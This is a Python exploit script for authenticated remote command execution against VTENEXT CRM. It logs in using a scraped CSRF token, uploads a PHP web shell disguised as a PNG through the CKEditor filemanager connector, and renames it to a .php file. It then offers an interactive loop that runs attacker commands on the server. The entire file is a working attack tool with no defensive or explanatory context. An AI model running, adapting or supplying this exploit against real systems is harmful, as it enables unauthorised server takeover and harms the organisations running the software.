import os
import sys
import requests
import argparse
from bs4 import BeautifulSoup

asciiArt="""

⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣶⣾⣿⣿⣿⣿⣷⣶⣦⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣠⣴⣿⠿⢛⣩⣥⣶⠶⠶⠶⠶⣶⣬⣍⡛⠿⣿⣦⣄⠀⠀⠀⠀⠀
⠀⠀⠀⣠⣾⡿⢋⣥⠞⠋⠈⣿⣿⠀⠀⠀⠀⣿⣿⠉⠙⠳⣬⡛⢿⣷⣄⠀⠀⠀
⠀⠀⣴⣿⠏⣴⠋⠀⠀⠀⠀⣿⣿⡆⠀⠀⢸⣿⣿⠀⠀⠀⠀⢹⣦⠻⣿⣦⠀⠀
⠀⣼⣿⢃⣾⣿⣏⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⣹⣿⣷⡘⣿⣧⠀
⢰⣿⠇⡾⠻⡅⠉⠛⢦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⡴⠛⠉⢨⠟⣧⢸⣿⡆
⣾⣿⢸⡇⠀⠹⣄⠀⠀⠈⢻⣿⡿⢿⣿⣿⡿⢿⣿⡟⠁⠀⠀⣰⠋⠀⢸⡆⣿⣷
⣿⣿⢸⡇⠀⠀⣘⣆⠀⠀⠀⠻⣷⣦⠀⠀⣴⣾⠏⠀⠀⠀⣰⣃⠀⠀⢸⡇⣿⣿
⢿⣿⢸⣷⣾⣿⡿⠟⢦⠀⠀⠀⠹⣿⣇⣸⣿⠏⠀⠀⠀⡼⠻⢿⣿⣷⣾⠇⣿⡟
⠸⣿⡆⢿⡉⠁⠀⠀⠈⢧⠀⠀⠀⠙⣿⣿⠃⠀⠀⢀⡜⠁⠀⠀⠈⢙⡟⣸⣿⠇
⠀⢻⣿⡌⢷⡀⠀⣠⣴⣿⣷⡀⠀⠀⢸⡇⠀⠀⢀⣾⣿⣦⣄⠀⢀⡾⣡⣿⡟⠀
⠀⠀⠻⣿⣦⠻⣿⣿⠿⠋⠀⠳⡄⠀⢸⡇⠀⢠⠎⠀⠙⢿⣿⣿⢟⣴⣿⠟⠀⠀
⠀⠀⠀⠙⢿⣷⣬⡛⢦⣄⡀⠀⠹⣄⣸⣇⣠⠏⠀⢀⣠⡴⢛⣵⣾⡿⠃⠀⠀⠀
⠀⠀⠀⠀⠀⠉⠻⣿⣶⣬⣉⣛⠲⠿⠿⠿⠿⠖⣛⣩⣥⣾⣿⠟⠉⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠻⠿⠿⣿⣿⣿⣿⠿⠿⠟⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

"""


cookies = {
    "PHPSESSID": "",
    "savelogin": "0"
}


def stage1(target, username, password):

    # Send GET request to obtain the "__csrf_token" value

    response = requests.get(f'{target}/index.php?action=Login', verify=False)

    # Grab cookies
    cookies["PHPSESSID"] = response.cookies.get('PHPSESSID')

    # Extract "__csrf_token" value from the response
    soup = BeautifulSoup(response.text, "html.parser")
    csrf_token = soup.find("input", {"name": "__csrf_token"})["value"]
    print(csrf_token)

    # Prepare POST request data
    post_data = {
        "module": "Users",
        "action": "Authenticate",
        "return_module": "Users",
        "return_action": "Login",
        "free_params": "",
        "user_name": username,
        "user_password": password,
        "Login": "Login",
        "__csrf_token": csrf_token
    }


    # Send POST request with the extracted "__csrf_token" value
    post_response=requests.post(f'{target}/index.php?action=Login', data=post_data, cookies=cookies, verify=False, allow_redirects=True)

    print(f" [*] Status Code: {(str(post_response.status_code))}")
    
    if 'You must specify a valid username and password' in post_response.text:
        print(" [*] Login failed :(")
        sys.exit()
    else:
        print(" [*] Login successfully\n")
        print(" [*] Stage 1 completed\n")
    
# Stage 2

def stage2(fpath, interactive):

    # Stage 2 exploit - Upload file

    print(" [*] Stage 2 started")

    ckEditor = f'{target}include/ckeditor/filemanager/connectors/php/filemanager.php'

    print(" [*] Uplaoding the file...")
    
    try:
        with open(fpath, 'rb') as f:
            file_data = f.read()
    except FileNotFoundError as e:
        print("file not found!, please specify a valid file path")   

    file_name = fpath.split('/')[-1]
    file_type = 'image/png'
    
    fields=[('mode', (None, 'add')),('currentpath', (None, 'storage/images_uploaded/')),('newfile', (file_name, file_data, file_type)),('fpath', (None,'')),('upload', (None,'Upload'))]

    # Send the upload request
    response_upload = requests.post(ckEditor, cookies=cookies, files=fields)

    if response_upload.status_code == 200:
        print(" [*] File uploaded successfully!\n")
    else:
        " [-] Upload failed :("

    # Rename the file with php extension
    renameURL = f'{target}include/ckeditor/filemanager/connectors/php/filemanager.php?mode=rename&old=storage/images_uploaded/{fpath}'+"&new=" + os.path.splitext(fpath)[0]+".php"

    response_r = requests.get(renameURL, cookies=cookies, verify=False)

    if response_r.status_code != 200:
        print(" [*] Something went wrong!\n")
    
    shell = f'{target}storage/images_uploaded/' + os.path.splitext(fpath)[0] + '.php'
    
    if interactive:
        while True:
            cmd = input("[*] cmd>: ")
    
            if cmd == 'exit':
                print("Exiting program...")
                break
    
            params = {'cmd': cmd}
    
            response = requests.get(shell, params=params, verify=False)
    
            print(response.text.replace('GIF89a', ''))
    else:
        print(f" [*] Enjoy your shell at {shell} \n")      
    
# Parsing arguments

parser = argparse.ArgumentParser(description='VTENEXT Authenticated Command Execution')
parser.add_argument('-t', '--target', required=True, help='Specify the target URL (http://vulnerabletarget.com/)')
parser.add_argument('-u', '--username', required=True, help='Specify the username')
parser.add_argument('-p', '--password', required=True, help='Specify the password')
parser.add_argument('-f', '--file', required=True, help='file containing the php shell to upload')
parser.add_argument('-i', '--interactive', action='store_true', help='Enable interactive mode (default interactive shell)')

if __name__ == "__main__":
    print(asciiArt)
    args = parser.parse_args()
    target = args.target
    fpath = args.file
    interactive = args.interactive
    username = args.username
    password = args.password
    
# start the first stage
stage1(target, username, password)
stage2(fpath, interactive)
